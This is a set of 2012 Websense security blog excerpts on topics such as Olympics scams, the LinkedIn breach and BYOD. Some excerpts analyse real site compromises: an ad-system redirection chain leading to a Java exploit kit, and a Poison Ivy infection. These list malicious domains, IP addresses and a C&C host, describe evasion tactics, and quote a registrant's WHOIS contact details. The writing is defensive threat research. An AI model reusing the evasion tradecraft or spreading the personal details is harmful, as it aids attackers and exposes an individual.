In addition, we’ll see thousands of other sites re-streaming or hosting the content. The internet will be awash with Olympics.\n\nAnd while I’m as excited as most, all this online Olympics access raises two major concerns:\n\nAn increase in social engineered attacks - Cybercriminals will leverage the Olympics to launch social engineered attacks to gain access to an individual or organization’s system. Social engineering gets them to the doorway by tempting users to click on a malicious link or file. But, for some companies, the door isn\'t going to be strong enough to stop the bad guys from coming in. There is going to be a huge influx of new sites being created and hosted just around the games. And many organization’s reputation-based defenses won’t classify them accurately. This compounds the issue of degradation of traditional signature-based defenses.\n	Corporate network bandwidth stress – An event of this proportion can consume an enormous amount of corporate network bandwidth. In particular, EMEA and APAC countries are heavily impacted due to the sheer number of events that coincide with the middle of the workday. And, mobile users on restricted or metered data plans will not be looking at mobile devices for their viewing. They will be looking to their work machines with a perception that there are big pipes available for viewing.\nAll that burning bandwidth and streaming media can come at a significant price to organizations. In preparation for the games, Websense is providing its customers with innovative ways to protect and manage their organization’s online profile during the Olympics.\n\nTo help companies understand and manage the bandwidth load of the Olympics, all streaming and internet media from the Olympics will be placed into a ‘Special Events’ category. This category is used by Websense for all major global events and makes it easy for Websense customers to see the bandwidth use and place limits and controls on that bandwidth as appropriate to the organization.\n\nIn addition to the activation of the Special Events category to help customers manage Olympic related bandwidth risks, Websense has recently made two other announcements that are of interest. First, several new URL categories were recently introduced to provide additional malware and other cyber threat defense options, a menace which is sure to leverage Olympic themes in their attacks at this time.

We managed to spot this attack iteration before it became fully active, before malicious files were uploaded to the exploit kits that cleartrip.com was redirected to, and before all the malicious redirection nodes that cleartrip.com led to were active. \nThe tactics that the cyber criminals used show what goes into making a legitimate website\'s infection less obvious and more difficult for security products to detect. These tactics included the following:  \nTargeting a website\'s local ad system and masquerading as legitimate ads \n  Manually intervening on a compromised website and preparing multiple domains to ensure redundancy  \n  Obfuscating available malicious toolkit redirectors to circumvent detection\n  Using advanced traffic direction system components and masquerading as a legitimate website to remain covert \n  Using exploit kits that serve Java-based exploits only\n \nThe next image summarizes the infection redirection chain leading to the exploit website as it started from cleartrip: \n\n \nIn this section, we\'ll take a closer look at the tactics we listed above: \n \nTactic 1: Targeting the local ad system and masquerading as part of the legitimate ad chain \nThe attackers seemed to focus on cleartrip.com\'s local ad system. Having that specific component compromised allowed them to serve malicious code through ads maintained by the website itself. The ad system on cleartrip is a third-party component plugin developed by Openx. Targeting third-party plugins is a very common tactic used to compromise legitimate websites. In this instance, it looks like the attackers gained control of the website\'s ad system since malicious code was restricted and served from that area only. Other cases of abuse of Openx components through exploitation and serving malicious content are documented throughout the Web.  \n\"Malvertizing\" is another form of loading malicious code with advertisements. This is when third-party advertisers have their ads or their infrastructure compromised and then having their ads injected and loaded with malicious code. However, in the cleartrip attack, the local ads were served by cleartrip.com itself and not by a third party. By gaining unauthorized access to the Openx advertising component on the website, the attackers succeeded in sabotaging and injecting ads with malicious code. Malicious code loaded by ads is harder to detect because loaded ads usually reside at deeper path levels of the website and the malicious code blends well with the rest of the ad content. In contrast, most compromises we see in the labs tend to have injected code on the main page of a website or through pages that are loaded by the main page of a website.  \nWhen we checked the IP address of the website of one of the malicious redirectors in this attack, euro-cool.in, we saw that it was hosted on IP address 85.17.122.245. A host report on that IP revealed more websites that have the same purpose and that are part of the attackers\' malicious infrastructure (image 2). Some of the websites\' names contain \"openx,\" which leads us to surmise that the individual or group behind this attack is purposefully targeting websites that have the Openx plugin.\n \nIt\'s evident that the attackers were trying to blend in with legitimate ad traffic and appear to be a legitimate part of the ad chain. If you look at the detailed redirection flow in the set of images below and specifically at steps number 3 and 4, you\'ll clearly see keywords like \"advertisement\" and URL patterns that are used by legitimate ad providers, such as this on the malicious redirection stage: /banners.cgi?advert_id=1&banner_id=1&chid=341aa8fca26bcff7830499c1c5f8e359 \n \nTactic 1 summary: By targeting a local website\'s ad serving component and injecting code into legitimate ads served locally by a website, attackers can more easily evade detection and remain undiscovered. \nImage 1: The Openx advertising plugin login page \n\n \nImage 2: Websites hosted on  85.17.122.245 (euro-cool.in)\n\n \nImage 3: Detailed redirection flow of the attack\n\n\n \nTactic 2: Manually intervening on a compromised website and preparing multiple malicious domains to ensure redundancy  \n \nThe redirection chain we illustrated above led to an active exploit website, however the malware binaries that were downloaded after the successful exploitation were just stubs and didn\'t do anything malicious at all. It appears that the attackers didn\'t get a chance to upload their desired malicious files to the exploit website. In addition, the redirection chain illustrated above didn\'t use the illustrated websites exclusively. For example, in other locations on cleartrip.com, infected ads led to the malicious redirector euro-mary.in, which had the same purpose of euro-cool.in and was served in the same structure as euro-cool.in. But euro-mary.in was a \"dead\" redirect and didn\'t redirect to an exploit website.\n \nhxxp://euro-mary.in/banners.cgi?advert_id=1&banner_id=1&chid=341aa8fca26bcff7830499c1c5f8e359\n \n\n  euro-mary.in was registered on 2012-06-26, and we believe that it was registered specifically for this attack but was, fortunately, detected before it became fully active. euro-cool.in was also registered on the same date, 2012-06-26. The domains were registered by an individual called Roman Inozemtsev which is probably a fake name. Here are more details:\n   \n  \n  \n\n\nAdmin Name:Roman Inozemtsev\n  Admin Organization:N/A\n  Admin Street1:R-N TBILISSKIY, UL. TRUDOVAYa D.18\n  Admin Street2:\n  Admin Street3:\n  Admin City:Tbilisskaya\n  Admin State/Province:Tbilisskiy r-n\n  Admin Postal Code:352361\n  Admin Country:RU\n  Admin Phone:+7.9060585279\n  Admin Phone Ext.:\n  Admin FAX:\n  Admin FAX Ext.:\n  Admin Email: rework11@mail.ru \n\nFrom the tactics that we have observed so far, we believe that the attackers were intervening and setting up an infrastructure necessary for exploitation manually, and that it\'s being done with redundancy in mind. The attacker, in this case, was a bit careless and had one of the malicious redirectors, euro-cool.in, on its way to carrying out the exploitation. However, as we mentioned, although the exploits were active, the downloaded malware was a stub and not malicious. The image below reveals how the malware stubs were downloaded to the Windows temporary files folder after the exploit succeeded (image 4). \n \nTactic 2 summary:  Manually intervening on a compromised website and preparing multiple domains to ensure redundancy are ways to prolong the duration of an attack by serving several exploitation chains.\n \nImage 4: Dropped stub files by the exploit kit\n \n \nTactic 3: Obfuscating available malicious tool-kit redirectors to circumvent detection\n \nThe code that the attackers injected into legitimate ads on cleartrip.com was obfuscated (marked as 1 and marked in red on the exploitation chain image). Once the code was de-obfuscated, it unveiled a known redirector tool-kit code that is used and available in the underground for the same purposes of acting as a redirection point to exploit websites. The de-obfuscated code shows \"decision-making\" code, which means it includes code that detects the browser\'s version of the browsing user. In this case, if the user\'s browser is Internet Explorer or Firefox, only then will the user be sent to the next level of the exploitation chain. The code also assigns a cookie to the user\'s browser, so it can be identified at the next redirection levels.  \nObfuscating code is a very common tactic to hide injected malicious code on legitimate websites. It can effectively hinder efforts to detect malicious code since it applies the same concept as compressing and encrypting code for malicious files with packers and crypters in order to evade known malicious code detection. Scanning the obfuscated code of the redirector toolkit yields a lower number of results from antivirus vendors than scanning the clear text code of the redirector toolkit.\n \nTactic 3 summary: Another way to avoid detection is obfuscating available malicious tool-kit redirectors, such as by using reliable underground tool-kits that are reliable and proven to work while hiding their activity with layers of obfuscation.\n \nTactic 4: Using advanced Traffic Direction System (TDS) components and masquerading as legitimate websites to remain covert\n \nThe redirector on stage 2 of the attack (euro-cool.in and euro-mary.in) does not redirect directly to the exploit website, but to a Traffic Direction System on sciencedailyreview.com (marked as 3 in the exploitation chain). This system picks and chooses whether to exploit the computer. The purpose of a TDS is to scrutinize all the possible details that can be derived from the visiting user\'s IP address and the visiting user\'s browser. For example, this method is a handy way to avoid known IP ranges of security companies and IP ranges that reside in certain geographic locations that might not be of interest for the attacker to infect. \nIn this case, the TDS system resides on sciencedailyreview.com. This website mimics and contains some code from the legitimate website, www.sciencedaily.com, a website about science. The malicious TDS in our case has two faces: if the visiting browser fulfills certain conditions, then it will be redirected to the exploit website, but if it doesn\'t, then it will be redirected to a false and copied representation of a legitimate website with content taken from the legitimate website www.sciencedaily.com. This fake, malicious website is even indexed through Google and serves legitimate content if visited through Google searches and has more than 34,000 cached pages by Google (see Image 5).  \nThe malicious side of sciencedailyreview.com redirects to the exploit website, but first, it checks exactly what Java version is installed on the user\'s machine (marked as 3 in the exploitation chain). The Java version information is essential because then a decision can be made about whether the user\'s installed Java version is vulnerable and based on that decision, redirects to the exploit website and serves the right Java exploit to the user\'s machine. \n sciencedailyreview.com was registered on 2012-05-03, and its registration details are anonymous.\n \nTactic 4 summary:  Using advanced Traffic Direction System (TDS) components and masquerading as legitimate websites to remain covert help evade detection and prolong the lifespan of malicious websites.\n \nImage 5: sciencedailyreview.com masquerades as a legitimate website and is cached by Google search engine\n\n \nTactic 5: Using exploit kits that serve Java-based exploits only\n \nThe exploit website (marked as 5 in the exploitation chain) serves Java-based exploits only. Java has been one of the most popular exploited components on user machines in the past year. In general, exploit kits target several components by holding several exploits for local installed components like the local browser, Adobe Acrobat Reader, Adobe Flash Player, Java, and more. Using several exploits can prove \"noisy\" and can result in detection of the exploit site. Tactically targeting one component for exploitation is more effective than targeting a few components since doing so is a more focused, and hence \"quieter\" approach that reduces the chances of the kit being discovered. Java is a good choice since usually exploits for that platform are reliable and can serve several platforms (e.g., the Java framework is also installed on Mac computers). In addition, Java is an interpreted programming language, which means, with relatively little effort, attackers can use it to obfuscate malicious code with cheap obfuscator kits that can be bought in the Black Hat underground market. \nIn our case, the exploit kit on the exploit server appeared to be the \"Neosploit\" exploit pack, and the exploit that was served targeted the Java vulnerability described in CVE-2012-0507. This infamous exploit was used in the Flashback mass attacks and also used in the compromise of Amnesty International UK and the compromise of the Institute for National Security Studies (Israel).\n \nTactic 5 summary: Using exploit kits that serve Java-based exploits is an effective way to evade detection\n \nImage 6: Neosploit exploit kit - this version serves only Java based exploits\n\n \nIn this blog, we took a look at several tactics that cyber criminals employ when they compromise a legitimate website for malicious purposes.

When previous London Olympics were held in 1908 and 1948, cyberattacks weren\'t even the stuff of science fiction. This time around, they are a real concern. Hackers are already taking advantage of the huge explosion in search engine requests, ticket sales, online streaming, and social media postings that will occur as a result of this 17-day sports event. \n\n\n\nThe 2008 Beijing Olympics were the target of about 12 million cybersecurity incidents per day. In February, we blogged about Olympic ticket scams associated with the 2012 London games, but that was only the beginning. Ticket scams are a major security concern due to the money involved; four years ago, tickets to the Beijing Opening Ceremony were sold on the black market for $26,000 each.\n\nThe U.K. government is preparing for all kinds of attacks, from actual terrorism to computer threats. Cabinet Office minister Francis Maude said, \"We have rightly been preparing for some time--a dedicated unit will help guard the London Olympics against cyberattacks. We are determined to have a safe and secure Games.\" He added that an essential element of security is keeping updated on emerging threats: \"Our responses have to be fast and flexible. What works one day is unlikely to work a matter of months or even weeks later.\"\n\nThe event has been called \"the first social Olympics,\" and organizers anticipate social media will be more important than ever, which means online security is more of a concern than ever. Records will be broken not only on the track and in pools, but also in internet traffic. Ofcom, the U.K. telecom regulator, anticipates the wireless spectrum demand to double in London during the games.  Websense® will help administrators control bandwidth consumption by using our Advanced Classification Engine™ (ACE) to classify streaming media and internet video from the Olympics into the Special Eventscategory.\n\nGames organizers have set up an Olympic Athletes\' Hub to encourage connection among competitors and fans, but at the same time, have imposed some very strict limits on how they can use social media. We first heard back in January from a friend who is one of the 70,000 Games Makers volunteers that she and her colleagues were warned their social media usemight compromise the reputation and security of the event.\n\nTicket purchasers are also being told that they may not \"license, broadcast or publish video and/or sound recordings, including on social networking websites and the internet more generally, and may not exploit images, video and/or sound recordings for commercial purposes under any circumstances, whether on the internet or otherwise, or make them available to third parties for commercial purposes.\"\n\nWhether any of this will or even can be enforced remains to be seen. The official IOC guidelines apply (in theory) only to \"participants and other accredited persons,\" but there is a great deal of confusion and concern about what can and can\'t be shared, and by whom.  U.K. legal consultant Rachel Boothroyd provides a useful overview, guidelines, and summaryprimarily for social media professionals.\n\nAnyone can be targeted by email scams abusing the \"London 2012\" name, claiming the recipient has won tickets or a large amount of money from a nonexistent \"Olympics lottery.\" The recipient is given a claim number and told to contact a claim agent—and of course, advised to keep the information confidential until the prize is claimed, to avoid spreading the word about the scam. As we have seen in many previous email scams, victims are told they have to make some kind of payment to claim their prize. An official lottery will pay you right away and will not require payment to release your winnings. Email scams often give themselves away through poor use of English, misspellings, U.K. phone numbers starting with 070, and personal email accounts like Gmail or Hotmail accounts. \n\nCommon sense may keep you safe in most situations, but hackers and spammers are quickly coming up with new ideas on how to attract and take advantage of new victims. \n\nWebsense is protecting our customers from scams and other security problems by ACE, our Advanced Classification Engine.', 'https://www.forcepoint.com/security-labs/faster-higher-stronger%E2%80%94olympic-security-risks\n');

As the world’s largest professional social network, LinkedIn is unique because it has legitimate uses for almost every employee.\nLinkedIn’s password breach could result in three serious ramifications for businesses everywhere:\nCybercriminals can take advantage of trust and social engineering attacks. If you are ‘linked’ to a trusted colleague you are more likely to click on a malicious link sent from them, which may open the door to targeted attacks and confidential data theft.\nMany LinkedIn accounts are tied to other social media services, such as Facebook or Twitter, so posts with malicious links can also be spread to a larger audience.\nMost of us are creatures of habit and have the same password for multiple accounts. The consequences of a breached password could reach across email, social media, banking accounts, and mobile phone data.\nIn my last post, I provided an email template for you to share with employees about changing their individual passwords, but it doesn’t stop there. The truth is many of your employees are going to ignore changing their passwords.\nSo what next? Well, to be honest, you are just getting started. First, we need to look at the three likely attack scenarios that might develop from this breach:\nEmployees are tricked into clicking a malicious link from a trusted colleague through their compromised friends status feed (this could be a broad or targeted attack).\nA generic spam email is sent from compromised accounts to one of your employees, leading them to a malicious site.\nSophisticated attackers collect data on their target (your CEO, CFO, etc.), find a suitable LinkedIn contact to compromise and send a tailored lure, which will likely lead to data-stealing code.\n\nYou need a strategy to protect against these and other attack scenarios. Here’s a seven-step check list for mitigating your risk.\nEducate, educate, educate your employees. An ounce of prevention can do wonders for your organization’s security. After you have educated, use tools like PhishMe.com to test whether employees are “getting it.”\nDouble-check your core best practice procedures.Are all your security solutions up to date? \nVerify your social media controls and ensure all related policies are current.\nReview what solutions and settings you have in place to protect against targeted attacks. People post true and explicit details about their background on social media sites, which makes them ripe for socially engineered attacks. Can you prevent targeted attacks from email, the web, and mobile devices?\nPrepare to spend more time following up on suspicious events or activity. This means digging into logs with more urgency to ensure you have not been targeted or compromised.\nYou need to be able to monitor data in motion. Your data loss prevention solution should block sensitive information from leaving the network via both email and web channels, not just discover that it’s lying around on the wrong server. Make sure you have this capability.\nIn addition to DLP, investigate what other outbound security measures you have to identify and contain botnet or other malicious activity.\nThe potential implications for your business are serious.

Sure, you may not have direct IT control over individual LinkedIn accounts, but your communication may alleviate social engineering attacks on employees and your network. In addition, providing security guidance to your employees can only help your employee education efforts.

It can go something like this: \n“Today it was reported that more than 6.4 million LinkedIn passwords have been hacked. It’s highly recommended that all [insert company name here] employees and contractors change their LinkedIn password immediately. Taking this action will help prevent cybercriminals from breaking into your account, stealing your personal information, contacting your LinkedIn contacts, and potentially damaging your online reputation.\nBelow are a 6 password tips:\nChange your password regularly.\n  Make your password longer than six characters and complex. For example, use a combination of numbers, letters, upper/lower case letters, and punctuation marks.\n  Create a new password for each website, especially for banking and social media sites that contain personal information. Do not use the same password for multiple websites.\n  Avoid using obvious passwords. For example, your address, birthday, “password,” or 12345.\n  Never save your passwords in a file. If you need to store them, use a secure vault application to manage them, such as lastpass, etc.\n  Don’t use your email as your user ID unless that’s the only option.\nIf your password at work is similar to your LinkedIn password, please change that as well. It could potentially affect the security of our organization.

The current address system we have in place is known as IPv4 (e.g. A.B.C.D or four nodes) and has 232 or about 3 billion addresses available.  Or I should say had available.\nIn February 2011, the last block of top level IPv4 addresses were granted. Now, all of these aren’t necessarily in use. The amazing thing is that in the short time of the internet, we saw billions of IPv4 addresses assigned. Essentially, the internet as we know it was about to run out of space. Too many cars on the road, as it were. \nTo change that, a number of years ago, the IPv6 protocol was established using 128 bit (e.g. A.B.C.D.E.F or six nodes), rather than 32 bit addressing options. This expands the potential amount of addresses on the internet from 232 to 2128 addresses.\nSo what does this mean for your company? Well, at some point if you don’t prepare for the switch you may begin to experience some hang ups and some sticky patches. Simply put, you are going to need to make the switch to IPv6 or at least run parallel systems. The great news is that Websense web security solutions are already IPv6 capable, so you can keep your networks safe from malicious, advanced threats and data loss over the web.\nWhat else do you need to do to prepare? Well, InformationWeek has a great article on recommendations to make the switch in your business. As a fun aside, a quick question for you.

If you’ve read that piece, you may now be wondering how that compares with the rest of the world. The Websense Security Labs recently released our2012 Threat Report exploring the biggest threats, trends, and themes collected by the Websense ThreatSeeker Network and investigated by our security lab research teams.\n 2011 redefined the way many think of and view internet and corporate security. 2012 is continuing this trend. From high profile targeted attacks, hacktivism, data theft and the leverage of exploit kits to selectively deliver malware dropper files when vulnerabilities are detected on user systems, the year forced everyone to think, “Am I next?”\n In the report, the Websense Security Labs looks closely at:\nThe trifecta that is driving epidemic levels of data theft: 1) extremely effective lures in web, social media and email; 2) evasive and hard-to-detect infiltration of malware in targeted attacks; and 3) sophisticated exfiltration of confidential data.\n  Advanced threats can be described in six stages: lures, redirects, exploit kits, dropper files, call-home communications, and data theft.\n  We’ve looked at the ways these steps are morphing and being used to propagate attacks. While we definitely see an increase in targeted attacks, the mass compromise continues to occur on a regular basis. What has changed is the way these criminals are luring their victims to click. And, it is often involving more social media lures.\nOther key findings include:\n82 percent of malicious websites are hosted on compromised hosts.\n  55 percent of data-stealing malware communications are web-based\n  43 percent of Facebook activity is streaming media, including viral videos. That\'s more than five times the next largest category of news and media within Facebook. The streaming media percentage is important because web lures (like videos, fake gift offers, surveys, and scams) prey on human curiosity and have moved onto the social network. Websense has partnered with Facebook to scan all clicked Facebook web links so that Websense researchers have unprecedented visibility into the social network\'s content.\nThe Websense Security Labs Threat Report provides metrics and practical advice for IT Security professionals.

However, the website owners rectified this issue after we advised them about the injection. In early 2009, we discovered this same site was compromised, and in 2010, we reported another injection of an Amnesty International website, this time the Hong Kong site. \nIn the most recent case, we noticed that the exploit vector used was the same Java exploit (detailed in CVE-2012-0507) that has been used worldwide, and which has become somewhat infamous as the cause of the recent massive Mac OS X infection with Flashback.  \nWebsense customers are protected from these threats by ACE, our Advanced Classification Engine. \nThe following is a screen shot of the detected code injection: \n\n(click on the picture to enlarge)\n \nIn the screen shot, we can see the similarities between this injection and the INSS injection we reported last week. This clearly shows the use of the Metasploit framework and the precise name of the Java class used.

Canada had become the newest breeding ground of cybercriminal activity.\n  In the hopes that things would get better, we conducted an exact comparison of the same cybersecurity stats one year later. And we were even more disturbed to see that in Q1 2012, hackers are still taking advantage of Canada’s “squeaky clean” cyber reputation and remotely controlling Canadian servers to carry out their criminal attacks.\n  Across the board, we’re seeing all types of malicious content coming out of the Great White North. For example: \n170% Jump in Hosted Phishing Sites - Canada ranks #2 in the world for hosted phishing sites, jumping 170 percent in the last year. This is a significant increase and the country ranks ahead of some of the best known offenders like Egypt and Russia.\n  39% Increase in Bot Networks - Cybercriminals’ command and control centers are finding that Canadians make great hosts. In the past year, Canada saw a 39 percent increase in bot network activity.\n  239% Increase in Malicious Websites - The number of malicious URLs is also on the rise in Canada.

In the past, malicious content has traditionally been hosted on servers in places like Europe. But, now the bad guys are shifting their infrastructures to sites that are hosted in countries that traditionally have had better reputations.\n  Even after last year’s discovery, we still have not seen any big takedowns of malicious sites in Canada.

Its mission statement reads:  \"Our goal is to connect everyone in the world through the \'things\' they find interesting. We think that a favorite book, toy, or recipe can reveal a common link between two people. With millions of new pins added every week, Pinterest is connecting people all over the world based on shared tastes and interests.\"\n  How does it work?\n  Currently, the site is available by invitation only, but it’s quite easy to request an invitation either directly from the site or from a friend who’s already using it. Once you’re in, you create “pins”: images you want to post, including videos, along with any text captions you care to add. The “Pin It” button can be added to Firefox or your iPhone, allowing you to grab images anytime and anywhere.  It also adds a link to the source, automatically crediting the author and, presumably, avoiding copyright issues, which have sparked a lot of discussion.*\n  A collection of pins is called a “board,” which usually focuses on a theme or interest. By displaying images in a thematic board, Pinterest creates a visual collage which provides context and relationships for images in ways other social media sites do not.\n\nIt is precisely the social media elements that seem to be fueling Pinterest’s popularity.  Users can search pins, boards, or people. They can “like” other people’s pins, post comments, repin the images to their own boards, and even share them via Facebook and Twitter links, or via embedding in a blog or email. They can follow other users, see activity streams, and click through to the source of an image for more information, or to make a purchase. Collaboration with Flickr was just announced, which enables sharing in the user\'s Flickr account.\n   Who uses it?\n  The number of unique visitors per month to Pinterest has jumped in just under one year from less than half a million to well over 18 million. Most (68.6%) are in the US, but all parts of the world are represented—and growing. Users tend to spend quite a bit of time on the site: more than 15 minutes per day, which is over 50% more than Twitter.\n\n\nThis explosion has created a huge buzz around the site, and at Websense we’ve learned that sites which attract lots of users also tend to attract lots of security concerns. \n  What could possibly go wrong?\n  Any site that attracts a lot of users and attention inevitably becomes a target for hackers and spammers. Spam and other types of objectionable content can be reported to Pinterest with the click of a button, which suggests the site relies on its users to spot problems and flag them for review. Malicious image files—where embedded malware is hidden in an image file—can be a particular threat on an image-based platform.\n  A while back we wrote a blog about inexpensive application toolkits on Facebook. This time around, it\'s Pinterest\'s turn.\n  Here are a few examples of  spamming toolkits that automatically generate massive amounts of traffic on a spammer\'s Pinterest account.  Tools may be purchased individually or in packages, and prices range from about $25 to almost $2000 depending on the number and functionality desired.\n  One tool creates automatic \"likes\" for pins, and sends an email to the pin creator saying you liked it, along with a link to your profile.\n\n\n\nAnother tool finds the most popular pins and re-submits them into the same board name and category on the spammer\'s account.\n\n\n\nWebsense researchers found many similar tools for sale, all of which generate unnatural traffic to the spammer\'s account in order to increase the popularity of a site or brand.  Of course, Pinterest may notice or be informed of the unusual traffic and block the account. A bigger risk is that spamming tools may actually contain viruses, malware, or other threats, making the would-be hacker into a hacking target.  \n  Pinterest was recently the target of injected JavaScript code (possibly created by such spamming tools) that changed many pins into ads. A recent Pinterest blog post about spam on the platform generated a fair number of user responses about fake followers and spam (comments are now closed). And the site is reportedly using CAPTCHA, at least on some accounts, to ensure that users are human beings.\n  Regardless of how Pinterest evolves, you can be sure that Websense will stay on top of any security risks, helping you use social media safely.\n \n\n  \n    * Because pinning something actually creates a copy (as opposed to simply “liking” a pin), there has been a great deal of controversy and confusion around Pinterest and copyright.  The personal blog of a copyright librarian provides some useful discussion.', 'https://www.forcepoint.com/security-labs/pinning-down-pinterest\n');

Apart from the JavaScript payload there are several HTTP cookies sent in the response header specifying the country, state, city, latitude and longitude. Our analysis systems identified other likely C&C connections in the outbound connections of the malware samples in question. Interestingly, these connections try to hide the malicious HTTP using a forged user-agent string:\n\n \nLooking at the geolocation service abused by the malware we can make the connection that the \'CA\' part (country code for Canada) in this user-agent is used to disclose the geolocation of the infected machine to the botnet server. This information can be used by the botmaster for statistics or to give different commands to infected machines in certain countries.\n \nAs of the time of writing this blog post, a total of 4,775 samples that ran in our malware lab show connections to the adult geolocation service in question. Websense customers are protected against known variants of this malware; we also have real-time coverage in place for the traffic between the malware and the C&C servers.', 'https://www.forcepoint.com/security-labs/widespread-malware-abuses-unsecured-geolocation-service-adult-website\n');

Every time I ask my customers, I get a common response: mobility. The Bring Your Own Device phenomenon is weighing heavily on the minds of Canadian’s IT security elite. And they have a good reason to be concerned.\nBy 2014, 1.1 billion smartphones will be in use. Today, the average mobile worker has three devices:  smartphone, tablet, and laptop. Companies are allowing these devices to connect to their networks, despite their better judgment and the security risks. So, what’s the REAL mobile threat? Why is this a big deal?\nNew technology drives productivity, but it also increases risk.\nSensitive data on mobile devices travels – physically and electronically – from the office to home and other off-site locations. In addition, we expect to see targeted mobile-device attacks from malware, spyware, malicious downloads/mobile apps, phishing, and spam. That’s why some security experts see smartphones and other mobile devices as one of the most serious new threat vectors to an organization.\nAt SC Congress Canada, I’ll be discussing research from a Websense/Ponemon report that looks at the latest mobile risk intelligence from 451 Canadian security and IT professionals.  For example:\n58% of organizations experienced data loss resulting from employee use of unsecured mobile devices.\n  Canada is one of the countries that reported the most data loss and security exploits from mobile devices.\n  45% say that their employees circumvent or disengage security features such as passwords and key locks.\nBYOD is outpacing Canadian enterprise security and policy. I will tackle this issue alongside Dr. Larry Ponemon (Ponemon Institute), Michelle Warren (MW Research and Consulting), and Faiza Kacem (National Bank of Canada) at SC Congress Canada on Wednesday, May 9 at 9:00 a.m. at the SC Congress Canada.

The website appears to be injected with malicious code for over a week now. (Websense\' ACE provided protection against the type of injected malicious code since early 2009)\n \nOne of the interesting facts about this infection is that it uses the same Java exploit vector (CVE-2012-0507) that managed to infect around 600,000 Mac users in a massive scatter attack dubbed Flashback a few weeks ago.\n \nIt\'s also worth noting that in the last few months, Israeli websites have been under continuous cyber-based threats and attacks. We don\'t think that this latest infection is part of an organized mass infection campaign but is probably just part of that trend. We continue to look for additional websites leading to the exploit website.\n \nWe have contacted the Webmaster of the website and notified them on the issue and the location of the injected code on the website, so far, we haven\'t heard back from them.\n \nWebsense customers are protected proactively from these threats by ACE, our Advanced Classification Engine.\n\n \nHere\'s how this exploit works: if users visit the home page of the INSS website, the injected malicious Javascript code loads a Java exploiter. The injected code shown below consists of a \"document.write\" function call that uses decimal-encoded string characters to hide the exploit URL. Once decoded, the destination page may be retrieved. This means that users are silently redirected to the exploit page while their browser loads the website\'s home page:\n \nThe obfuscated injected content on the INSS home page looks like this:\n\n \nHere\'s the decoded content:\n\n \nAnd the content of the out.htm web page:\n\n \nBy merely looking at the code snippet above, we can see that the applet class\'s name suggests its intentions: \"msf.x.Exploit.class.\" After further investigation, we detected that \"test.jar\" holds the exploit of the well-known Java vulnerability CVE-2012-0507. The inner workings of the \"test.jar\" file reveal that it contains a rather large compressed text file called \"abc.txt\" that is filled with a huge number of \"a\" characters. Once decompressed, the file size is about 104 MB. We think that this is a technique that attempts to evade automated malware analysis technologies, since some of those systems typically avoid downloading the contents of big files, because malware tends to be small in size.\n\n \nFrom analyzing the contents of the Jar file, it was evident that it was generated by the Metasploit toolkit, which, as we mentioned, holds the vulnerability CVE-2012-0507:\n\n\nThe binary associated with the exploit, \"svchost.exe\" (MD5: 52aa791a524b61b129344f10b4712f52), is automatically installed on the victim\'s computer if followed by a successful Java exploiting attempt. \"svchost.exe\" is a variant of Poison Ivy, a remote administration tool (RAT) that can be used, as its name suggests, to control a computer remotely. The tool is robust and mature and may be used for legitimate purposes, but is also widely used for malicious purposes. Once Poison Ivy installs on the system it connects to a Dynamic DNS command and control address at:ids.ns01.us', 'https://www.forcepoint.com/security-labs/institute-national-security-studies-israel-falls-prey-poison-ivy-infection\n');

We also attended workshops and chapter meetings for (ISC)2 (International Information Systems Security Certification Consortium) and ISACA (Information Systems Audit and Control Association).\n\n\n	The Infosec conference presents high-level security information, such as security product demonstrations, rather than technical talks on topics like exploits and vulnerabilities. So we expected to hear presentations and general discussions about enterprise security and issues of concern to our customers.\n\n\n	Topics receiving the most attention at Infosec were: Mobile Security (MDM and BYOD), Big Data, APT (advanced persistent threat) and AET (advanced evasion technique), and SIEM (security information and event management).\n\n\n	Some vendors presented anti-DDOS (distributed denial of service) solutions, hardware destruction options, and network mapping tools.\n\n\n	Several booths were represented by universities and information security certification organizations like (ISC)2 and ISACA.\n\n\n	Mobile security is a hot topic at the moment. Most everyone in the private and public sectors is about to or has already implemented MDM (mobile device management) or other mobile security solutions. However, the main concern is not with the individual devices but with enterprise data protection. Companies are concerned about the BYOD (bring your own device) trend, so when employees access a company’s data with their own phones or tablets, the company can protect its sensitive data. It is important to remember that these mobile devices are also entertainment devices that employees may share with friends and family members. Some conference talks included discussions of data separation, so that when a device needs to be wiped, personal data is retained while company data is secured.\n\n\n	APT and AET were also popular topics at the conference. The IT professionals\' primary concerns were related to the response from security vendors in the event of a data breach or a sensitive data/information leakage due to APTs and AETs. Companies are aware of the potential risks of these types of threats, but in many cases companies may not have a good idea of the details of an attack. Follow-up contact and in-depth analysis by security vendors is needed. Using a detailed analysis of an attack from a security vendor, a company can protect against future threats by taking a layered approach to secure its assets and vital information. As a result, companies will have more trust in security vendors.\n\n\n	Email messages are still a main entry point for APT attacks, especially those using social engineering tactics and phishing attacks that target specific companies.\n\n\n	Some APT attacks are done with well-known penetration testing tools. Deploying protection against those tools can prevent these types of attacks.\n\n\n	Conference attendees also expressed interest in what was defined as a “security intelligence network,” which would permit close cooperation among vendors to forecast, prevent, and track various types of attacks.\n\n\n	Most conference booths had sales engineers, sales people, and marketing personnel to generate leads. However, a few participants (like Websense) included their security lab professionals. Some talks presented at the booths included demonstrations of how URLs can be injected, deobfuscation of JavaScript, penetration testing, what’s behind credential-stealing trojans, and the analysis and display of parts of exploit kits.\n\n\n	Thanks to the Infosec2012 organizers for a great conference in a great place!\n\n\n	\n\n\n	Websense Security Labs will continue its focus on security threat research and defense technology innovations.\n\n\n	The following researchers attended Infosec2012 and provided feedback for this blog: Amon Sanniez, Tamas Rudnai, Artem Gololobov, Gianluca Giuliani.

I know it’s not the beginning of the year, but if your schedule is anything like mine, this may be the first time you’ve had a minute to spare since the calendar moved to 2012. With everything in the threat landscape changing so frequently, it’s important to reassess your current status and plan for the coming year, whenever we can come up for air. So, I came up with the following nine tips to help you get a fresh start this spring:\n1. Ask, “What new threats and risks do I have this year that I didn’t last year?” Maybe they’re coming from the cloud. Mobile devices (and BYOD in general). Social networks. Have you opened up offices in other countries (especially high-risk countries)? You definitely have to consider new types and strains of malware, too. All of these risks require significant change that may require you to update your three-year strategy if you want to continue to be nimble and agile. \n2. Follow the money. Are you spending on effective security? I know some CSOs who are still pumping 80 percent of their security spend into antiquated technologies. Clean house on legacy applications like IDS and AV by moving to lower cost solutions that provide the same level of protection. Use the savings to invest in highly effective real-time content security that is context aware. And make sure that your personal resources are also allocated correctly; systems that require high maintenance can sometimes be replaced with new technologies that require less management.\n3. Assess your risk and determine what the bad guys are going after. Over the last year, the bad guys have changed their methods. Many are shifting their targets from PII to going after IP, board conversations, customer lists, etc. Make sure you protect the right stuff. \n4. Compare your internal awareness campaign with the latest issues and highest risk. For most 